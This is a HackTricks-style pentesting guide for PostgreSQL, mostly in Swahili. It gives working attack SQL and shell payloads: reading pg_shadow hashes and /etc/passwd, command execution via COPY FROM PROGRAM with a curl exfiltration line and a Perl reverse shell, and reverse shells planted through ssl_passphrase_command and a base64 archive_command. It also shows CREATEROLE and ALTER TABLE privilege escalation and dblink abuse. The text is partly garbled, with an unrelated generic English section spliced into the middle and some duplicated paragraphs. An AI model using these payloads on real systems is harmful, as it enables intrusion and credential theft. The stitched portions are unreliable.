# 5432,5433 - Kupima Uvamizi wa PostgreSQL

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia taratibu za kiotomatiki** zinazotumia zana za jamii za **hali ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## **Taarifa Msingi**

**PostgreSQL** inaelezwa kama **mfumo wa hifadhidata wa kiunganishi-kuhusiana** ambao ni **wazi chanzo**. Mfumo huu si tu unatumia lugha ya SQL bali pia unaimarisha lugha hiyo na vipengele vingine. Uwezo wake unaruhusu kushughulikia aina mbalimbali za data na shughuli, hivyo kuifanya kuwa chaguo lenye uwezo mkubwa kwa watengenezaji na taasisi.

**Bandari ya chaguo:** 5432, na ikiwa bandari hii tayari inatumika inaonekana kwamba postgresql itatumia bandari inayofuata (labda 5433) ambayo haipo katika matumizi.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Unganisha & Uchunguzi wa Msingi

### Connect

Unapotaka kufanya uchunguzi wa PostgreSQL, hatua ya kwanza ni kuunganisha kwenye seva ya PostgreSQL. Unaweza kutumia amri ifuatayo kwenye terminal yako:

```bash
psql -h <hostname> -p <port> -U <username> -d <database>
```

- `<hostname>`: Jina la mwenyeji wa seva ya PostgreSQL.
- `<port>`: Namba ya bandari ya seva ya PostgreSQL.
- `<username>`: Jina la mtumiaji wa kuingia kwenye seva ya PostgreSQL.
- `<database>`: Jina la database unayotaka kuunganisha.

### Basic Enum

Baada ya kuunganisha kwenye seva ya PostgreSQL, unaweza kufanya uchunguzi wa msingi kwa kutumia amri zifuatazo:

- `\l`: Kuorodhesha databases zilizopo.
- `\c <database>`: Kuunganisha kwenye database fulani.
- `\dt`: Kuorodhesha meza zilizopo kwenye database iliyochaguliwa.
- `\du`: Kuorodhesha watumiaji wa PostgreSQL.
- `\g`: Kutekeleza amri iliyochapishwa hapo awali.
- `\q`: Kutokea kwenye seva ya PostgreSQL.

Kwa kufuata hatua hizi za msingi, unaweza kuanza uchunguzi wako wa PostgreSQL na kugundua habari muhimu kuhusu seva na database.
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Ikiwa unapokimbia **`\list`** unapata database inayoitwa **`rdsadmin`** unajua kuwa uko ndani ya **database ya AWS postgresql**.
{% endhint %}

Kwa habari zaidi kuhusu **jinsi ya kutumia vibaya database ya PostgreSQL** angalia:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Uchunguzi wa Kiotomatiki
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Uchunguzi wa Bandari**

Kulingana na [**utafiti huu**](https://www.exploit-db.com/papers/13084), wakati jaribio la kuunganisha linashindwa, `dblink` hutupa kosa la `sqlclient_unable_to_establish_sqlconnection` pamoja na maelezo ya kosa. Mifano ya maelezo haya imeorodheshwa hapa chini.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* Mwenyeji amekwama

`MAELEZO: hakuweza kuunganisha kwenye seva: Hakuna njia ya kufikia mwenyeji "1.2.3.4" na kukubali uunganisho wa TCP/IP kwenye bandari 5678?`

* Bandari imefungwa
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* Bandari imefunguliwa
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
# Pentesting PostgreSQL

## Introduction

PostgreSQL is an open-source relational database management system (RDBMS) that is widely used in web applications. As a pentester, it is important to understand how to assess the security of PostgreSQL installations and identify potential vulnerabilities.

## Enumeration

### Version Detection

To determine the version of PostgreSQL running on a target system, you can use the following methods:

1. **Banner Grabbing**: Connect to the PostgreSQL service and analyze the banner message to extract the version information.

2. **Nmap Script**: Use the Nmap script `pgsql-info` to retrieve version information from the target system.

### Default Credentials

PostgreSQL does not have any default credentials. However, it is common for users to set weak or easily guessable passwords. Therefore, it is recommended to perform password guessing attacks using tools like Hydra or Burp Suite.

### User Enumeration

To enumerate users in a PostgreSQL database, you can use the following methods:

1. **Brute Force**: Use tools like Hydra or Burp Suite to perform brute force attacks against the login page.

2. **Error-Based Enumeration**: Exploit error messages to gather information about existing users.

## Exploitation

### SQL Injection

PostgreSQL is vulnerable to SQL injection attacks, which can allow an attacker to execute arbitrary SQL queries and potentially gain unauthorized access to the database. To exploit SQL injection vulnerabilities, you can use tools like SQLMap or manually craft SQL queries.

### Privilege Escalation

If you have gained access to a low-privileged user account in PostgreSQL, you can attempt to escalate your privileges to gain administrative access. Some common methods for privilege escalation in PostgreSQL include:

1. **Weak Passwords**: If the target system has weak passwords set for administrative accounts, you can try to crack them using tools like Hydra or John the Ripper.

2. **Stored Procedures**: Exploit vulnerabilities in stored procedures to execute arbitrary code with elevated privileges.

## Post-Exploitation

### Data Extraction

Once you have gained access to a PostgreSQL database, you can extract sensitive data by executing SQL queries or exporting the data to a file. Tools like pg_dump or psql can be used for data extraction.

### Persistence

To maintain access to a compromised PostgreSQL database, you can create a backdoor by creating a new user with administrative privileges or by modifying existing user privileges.

### Covering Tracks

To cover your tracks and avoid detection, you can delete logs and other evidence of your activities in the PostgreSQL database. However, be cautious as deleting logs may raise suspicion.

## Conclusion

Understanding the techniques and vulnerabilities associated with PostgreSQL is essential for conducting effective pentesting. By following the enumeration, exploitation, and post-exploitation techniques outlined in this guide, you can identify and exploit security weaknesses in PostgreSQL installations.
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* Bandari imefunguliwa au kufanyiwa uchujaji
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Katika kazi za PL/pgSQL, kwa sasa haiwezekani kupata maelezo ya kina kuhusu kosa. Hata hivyo, ikiwa una ufikiaji moja kwa moja kwenye seva ya PostgreSQL, unaweza kupata habari muhimu. Ikiwa kuchambua majina ya watumiaji na nywila kutoka kwenye meza za mfumo sio rahisi, unaweza kuzingatia kutumia njia ya mashambulizi ya orodha ya maneno iliyozungumziwa katika sehemu iliyotangulia, kwani inaweza kutoa matokeo chanya.

## Uchunguzi wa Mamlaka

### Majukumu

| Aina za Majukumu |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Jukumu lina mamlaka ya superuser                                                                                                                        |
| rolinherit     | Jukumu linarithi moja kwa moja mamlaka ya majukumu ambayo ni mwanachama wake                                                                                    |
| rolcreaterole  | Jukumu linaweza kuunda majukumu zaidi                                                                                                                           |
| rolcreatedb    | Jukumu linaweza kuunda databases                                                                                                                            |
| rolcanlogin    | Jukumu linaweza kuingia. Yaani, jukumu hili linaweza kutolewa kama kitambulisho cha idhini ya kikao cha awali                                                     |
| rolreplication | Jukumu ni jukumu la kuiga. Jukumu la kuiga linaweza kuanzisha uhusiano wa kuiga na kuunda na kuondoa nafasi za kuiga.                           |
| rolconnlimit   | Kwa majukumu ambayo yanaweza kuingia, hii inaweka idadi kubwa ya uhusiano unaoweza kufanywa na jukumu hili kwa wakati mmoja. -1 inamaanisha hakuna kikomo.                                 |
| rolpassword    | Sio nywila (soma daima kama `********`)                                                                                                        |
| rolvaliduntil  | Muda wa kumalizika kwa nywila (inatumika tu kwa uwakilishi wa nywila); `null` ikiwa hakuna kumalizika kwa nywila                                                                  |
| rolbypassrls   | Jukumu linapuuza sera za usalama wa ngazi ya safu, angalia [Sehemu 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) kwa maelezo zaidi. |
| rolconfig      | Chaguo-msingi maalum ya jukumu kwa ajili ya vipimo vya muda wa kukimbia                                                                                          |
| oid            | Kitambulisho cha jukumu                                                                                                                                           |

#### Vikundi Vinavyovutia

* Ikiwa wewe ni mwanachama wa **`pg_execute_server_program`** unaweza **kutekeleza** programu
* Ikiwa wewe ni mwanachama wa **`pg_read_server_files`** unaweza **kusoma** faili
* Ikiwa wewe ni mwanachama wa **`pg_write_server_files`** unaweza **kuandika** faili

{% hint style="info" %}
Tafadhali kumbuka kuwa katika Postgres, **mtumiaji**, **kikundi**, na **jukumu** ni **sawa**. Inategemea tu **jinsi unavyoitumia** na ikiwa unaruhusu **kuingia**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Meza

PostgreSQL uses tables to store data. A table is a collection of rows, where each row represents a record and each column represents a field or attribute of that record.

PostgreSQL hutumia meza kuhifadhi data. Meza ni mkusanyiko wa safu, ambapo kila safu inawakilisha rekodi na kila safu inawakilisha uga au sifa ya rekodi hiyo.
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Kazi

Functions in PostgreSQL are named blocks of code that can be executed by calling their name. They are used to perform specific tasks and can accept parameters and return values. Functions can be created using the `CREATE FUNCTION` statement and can be called using the `SELECT` statement.

In Swahili:

### Kazi

Kazi katika PostgreSQL ni vitengo vya namna ya kificho ambavyo vinaweza kutekelezwa kwa kuita jina lake. Hutumika kufanya kazi maalum na inaweza kukubali vigezo na kurudisha thamani. Kazi zinaweza kuundwa kwa kutumia kauli ya `CREATE FUNCTION` na zinaweza kuitwa kwa kutumia kauli ya `SELECT`.
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Vitendo vya mfumo wa faili

### Soma saraka na faili

Kutoka kwa [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) wanachama wa kikundi cha **`DEFAULT_ROLE_READ_SERVER_FILES`** (kinachoitwa **`pg_read_server_files`**) na **super users** wanaweza kutumia njia ya **`COPY`** kwenye njia yoyote (angalia `convert_and_check_filename` katika `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Kumbuka kwamba ikiwa wewe si mtumiaji mkuu lakini una ruhusa za **CREATEROLE**, unaweza **kujiweka mwenyewe kuwa mwanachama wa kikundi hicho:**
```sql
GRANT pg_read_server_files TO username;
```
[**Maelezo zaidi.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Kuna **kazi zingine za postgres** ambazo zinaweza kutumika kusoma faili au kuorodhesha saraka. Ni **watumiaji wenye uwezo wa juu** na **watumiaji wenye ruhusa maalum** tu ndio wanaweza kuzitumia:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Unaweza kupata **kazi zaidi** katika [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Kuandika Faili Rahisi

Ni **watumiaji wa juu** tu na wanachama wa **`pg_write_server_files`** wanaweza kutumia nakala kuandika faili.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Kumbuka kwamba ikiwa wewe si mtumiaji mkuu lakini una ruhusa za **`CREATEROLE`**, unaweza **kujiweka mwenyewe kuwa mwanachama wa kikundi hicho:**
```sql
GRANT pg_write_server_files TO username;
```
[**Maelezo zaidi.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Kumbuka kwamba COPY haiwezi kushughulikia herufi za mstari mpya, kwa hivyo hata ikiwa unatumia mzigo wa base64 **unahitaji kutuma amri moja**.\
Kikwazo muhimu sana cha mbinu hii ni kwamba **`copy` haiwezi kutumika kuandika faili za binary kwani inabadilisha baadhi ya thamani za binary.**

### **Kuongeza faili za binary**

Hata hivyo, kuna **njia nyingine za kuongeza faili kubwa za binary:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Msaada wa bug bounty**: **Jisajili** kwa **Intigriti**, jukwaa la bug bounty la malipo ya juu lililoanzishwa na wadukuzi, kwa wadukuzi! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata zawadi hadi **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **RCE kwa programu**

Tangu[ toleo 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), tu **watumiaji wakuu** na wanachama wa kikundi cha **`pg_execute_server_program`** wanaweza kutumia copy kwa RCE (mfano na utekaji nyara:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Mfano wa kutekeleza:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Kumbuka kwamba ikiwa wewe si mtumiaji mkuu lakini una ruhusa za **`CREATEROLE`**, unaweza **kujiweka mwenyewe kuwa mwanachama wa kikundi hicho:**
```sql
GRANT pg_execute_server_program TO username;
```
[**Maelezo zaidi.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Au tumia moduli ya `multi/postgres/postgres_copy_from_program_cmd_exec` kutoka **metasploit**.\
Maelezo zaidi kuhusu udhaifu huu yanapatikana [**hapa**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Ingawa iliripotiwa kama CVE-2019-9193, Postges ilieleza kuwa hii ilikuwa ni [kazi na haitasahihishwa](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE na Lugha za PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE na Vipengele vya PostgreSQL

Baada ya **kujifunza** kutoka chapisho la awali **jinsi ya kupakia faili za binary**, unaweza jaribu kupata **RCE kwa kupakia kipengele cha postgresql na kulipakia**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE kwa Faili ya Usanidi ya PostgreSQL

Faili ya **usanidi** ya postgresql inaweza **kuandikwa** na mtumiaji wa **postgres** ambaye ndiye anayesimamia database, kwa hivyo kama **superuser** unaweza kuandika faili kwenye mfumo wa faili, na kwa hivyo unaweza **kuibadilisha faili hii**.

![](<../.gitbook/assets/image (303).png>)

#### **RCE na ssl\_passphrase\_command**

Maelezo zaidi [kuhusu mbinu hii yanapatikana hapa](https://pulsesecurity.co.nz/articles/postgres-sqli).

Faili ya usanidi ina sifa kadhaa muhimu ambazo zinaweza kusababisha RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Njia ya ufunguo wa kibinafsi wa database
* `ssl_passphrase_command = ''` Ikiwa faili ya kibinafsi inalindwa na nenosiri (imefichwa), postgresql ita **tekeleza amri iliyotajwa katika sifa hii**.
* `ssl_passphrase_command_supports_reload = off` **Ikiwa** sifa hii iko **on**, **amri** itatekelezwa ikiwa ufunguo unalindwa na nenosiri **itafanyika** wakati `pg_reload_conf()` inatekelezwa.

Kwa hivyo, mshambuliaji atahitaji:

1. **Dump ufunguo wa kibinafsi** kutoka kwenye seva
2. **Ficha** ufunguo wa kibinafsi uliopakuliwa:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Badilisha**
4. **Dump** usanidi wa postgresql **wa sasa**
5. **Badilisha** usanidi na usanidi wa sifa zilizotajwa:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Tekeleza `pg_reload_conf()`

Nikipima hii, niligundua kuwa hii itafanya kazi tu ikiwa **faili ya ufunguo wa kibinafsi ina ruhusa 640**, inamilikiwa na root na na **kikundi cha ssl-cert au postgres** (kwa hivyo mtumiaji wa postgres anaweza kuisoma), na iko katika _/var/lib/postgresql/12/main_.

#### **RCE na archive\_command**

**Maelezo zaidi** [**kuhusu usanidi huu na kuhusu WAL hapa**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Sifa nyingine katika faili ya usanidi ambayo inaweza kudukuliwa ni `archive_command`.

Ili hii ifanye kazi, mipangilio ya `archive_mode` lazima iwe `'on'` au `'always'`. Ikiwa hivyo ndivyo, basi tunaweza kubadilisha amri katika `archive_command` na kuiwezesha kutekelezwa kupitia shughuli za WAL (write-ahead logging).

Hatua za jumla ni:

1. Angalia ikiwa hali ya kuhifadhi imeamilishwa: `SELECT current_setting('archive_mode')`
2. Badilisha `archive_command` na payload. Kwa mfano, reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Pakia upya usanidi: `SELECT pg_reload_conf()`
4. Lazimisha shughuli ya WAL ifanyike, ambayo itaita amri ya kuhifadhi: `SELECT pg_switch_wal()` au `SELECT pg_switch_xlog()` kwa baadhi ya toleo za Postgres

## **Udhibiti wa Mamlaka ya Postgres**

### Udhibiti wa CREATEROLE

#### **Kutoa**

Kulingana na [**nyaraka**](https://www.postgresql.org/docs/13/sql-grant.html): _Vyeo vyenye **`CREATEROLE`** inaweza **kutoa au kurejesha uanachama katika jukumu lolote** ambalo **si** mtumiaji **mkuu**._

Kwa hivyo, ikiwa una ruhusa ya **`CREATEROLE`** unaweza kujipa upatikanaji wa majukumu mengine (ambayo sio mtumiaji mkuu) ambayo yanaweza kukupa chaguo la kusoma na kuandika faili na kutekeleza amri:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Badilisha Nenosiri

Watumiaji wenye jukumu hili wanaweza pia **kubadilisha** **nenosiri** za watumiaji wengine **wasio watumiaji wakuu**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc kwa SUPERUSER

Ni kawaida kukuta kuwa **watumiaji wa ndani wanaweza kuingia kwenye PostgreSQL bila kutoa nenosiri lolote**. Kwa hiyo, mara baada ya kukusanya **ruhusa ya kutekeleza nambari**, unaweza kutumia ruhusa hizi kujiwekea jukumu la **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Hii kawaida inawezekana kutokana na mistari ifuatayo katika faili ya **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **KUBADILISHA JEDWALI LA privesc**

Katika [**makala hii**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) imeelezewa jinsi ilivyowezekana kufanya **privesc** katika Postgres GCP kwa kutumia uwezo wa ALTER TABLE uliopewa mtumiaji.

Unapojaribu **kumfanya mtumiaji mwingine awe mmiliki wa jedwali**, unapaswa kupata **kosa** linalozuia hilo, lakini inaonekana GCP iliruhusu **chaguo hilo kwa mtumiaji wa postgres asiyekuwa superuser**:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Kwa kuunganisha wazo hili na ukweli kwamba wakati wa kutekeleza amri za **INSERT/UPDATE/ANALYZE** kwenye **jedwali lenye kazi ya indeksi**, kazi hiyo inaitwa kama sehemu ya amri na **ruhusa za mmiliki wa jedwali**. Inawezekana kuunda indeksi na kazi na kumpa ruhusa ya mmiliki kwa **super user** juu ya jedwali hilo, na kisha kuendesha ANALYZE kwenye jedwali na kazi mbaya ambayo itaweza kutekeleza amri kwa sababu inatumia ruhusa za mmiliki.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Uchunguzi

1. Anza kwa kuunda meza mpya.
2. Ingiza baadhi ya maudhui yasiyohusiana katika meza ili kutoa data kwa kazi ya indeksi.
3. Tengeneza kazi ya indeksi yenye nia mbaya ambayo ina kifurushi cha utekelezaji wa nambari, kuruhusu amri zisizoidhinishwa kutekelezwa.
4. BADILISHA mmiliki wa meza kuwa "cloudsqladmin," ambayo ni jukumu la superuser la GCP linalotumiwa pekee na Cloud SQL kusimamia na kudumisha database.
5. Fanya operesheni ya ANALYZE kwenye meza. Hatua hii inalazimisha injini ya PostgreSQL kubadili muktadha wa mtumiaji wa mmiliki wa meza, "cloudsqladmin." Kwa hivyo, kazi ya indeksi yenye nia mbaya inaitwa kwa ruhusa za "cloudsqladmin," hivyo kuruhusu utekelezaji wa amri ya kabla ya hapo isiyoidhinishwa.

Katika PostgreSQL, mchakato huu unaonekana kama ifuatavyo:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Kisha, meza ya `shell_commands_results` italeta matokeo ya nambari iliyotekelezwa:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Kuingia kwa Njia ya Ndani

Baadhi ya mifano ya postgresql iliyopangwa vibaya inaweza kuruhusu kuingia kwa mtumiaji yeyote wa ndani, niwezekanavyo kuingia kwa njia ya ndani kutoka 127.0.0.1 kwa kutumia **`dblink` kazi**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Tafadhali kumbuka kuwa ili kazi ya awali ifanye kazi **kazi ya `dblink` inahitajika kuwepo**. Ikiwa haipo, unaweza kujaribu kuunda kwa kutumia
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Ikiwa una nenosiri la mtumiaji mwenye mamlaka zaidi, lakini mtumiaji huyo hawezi kuingia kutoka kwa anwani ya IP ya nje, unaweza kutumia kazi ifuatayo kutekeleza maswali kama mtumiaji huyo:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Inawezekana kuangalia ikiwa kazi hii ipo kwa kutumia:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Kazi iliyoundwa kwa kawaida na** SECURITY DEFINER

[**Katika nakala hii**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), wapimaji wa usalama walifanikiwa kufanya privesc ndani ya kipengele cha postgres kilichotolewa na IBM, kwa sababu waligundua kazi hii na bendera ya **SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
